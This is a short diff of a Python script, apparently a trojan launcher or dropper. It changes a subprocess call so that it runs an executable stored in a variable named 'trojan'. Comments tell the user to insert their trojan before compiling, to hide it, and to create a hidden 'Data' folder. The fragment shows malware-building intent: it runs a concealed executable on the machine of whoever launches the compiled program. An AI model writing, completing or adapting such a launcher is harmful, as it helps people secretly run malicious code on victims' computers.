@@ -49,6 +49,6 @@ if __name__ == "__main__":
     
     # change this and put your trojan before you compile
     trojan = r"test.exe" 
-    subprocess.run([r"test.exe"])
+    subprocess.run([trojan])
     # dont forget to hide the trojan
     # also create a "Data" folder and hide it
